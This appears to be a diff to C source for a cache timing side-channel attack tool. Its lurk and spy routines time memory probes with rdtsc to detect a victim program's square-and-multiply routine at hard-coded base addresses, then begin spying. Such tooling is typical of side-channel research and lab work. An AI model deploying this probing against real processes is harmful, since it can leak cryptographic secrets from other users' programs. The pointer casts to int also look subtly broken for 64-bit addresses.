@@ -211,7 +211,7 @@ void spy(char **target_adrs, int adrs_amount)
     printf("end spy\n");
 }
 
-void lurk(char **target_adrs, int adrs_amount)
+void lurk(void *base, char **target_adrs, int adrs_amount)
 {
     unsigned long long old_tsc, tsc = rdtsc();
     while(1)
@@ -222,10 +222,10 @@ void lurk(char **target_adrs, int adrs_amount)
         {
             tsc = rdtsc();
         }
-        bool detected = probe_treshold(target_adrs[0]);
+        bool detected = probe_treshold(base);
         if (detected)
         {
-            printf("Detected %d victim activity - starting spy \n", detected);
+            printf("Detected victim activity - starting spy\n");
             spy(target_adrs, adrs_amount);
             break;
         }
@@ -246,9 +246,7 @@ void control()
     // base should be 0x100401080 (square_and_multiply) or 0x1004010fe (main)
 
     // base linux 0x5555555551c7 main, 0x555555555149 sqm
-    #ifdef TESTEXEC_UBUNTU
-    adresses_t *targets = file_loader(probe_path);
-    #endif
+    
     // --------------------
 
     int map_len         = 20000; // max size bytes?
@@ -265,15 +263,18 @@ void control()
     // TODO offsets (?)
 
     // TODO run until detection and terminate after
-    
+    #ifdef TESTEXEC_UBUNTU
+    adresses_t *targets = file_loader(probe_path);
+    #endif
+
     char *target_adrs[targets->amount];
     node_t *node_current = targets->probe_adresses;
     for (int i= 0; i<targets->amount; i++)
     {
-        target_adrs[i] = node_current->adrs;
+        target_adrs[i] = (char *) ((int)node_current->adrs + (int) base);
         node_current = node_current->next;
     }
-    lurk(target_adrs, targets->amount);
+    lurk(base, target_adrs, targets->amount);
 }
 
 // default address values (?)
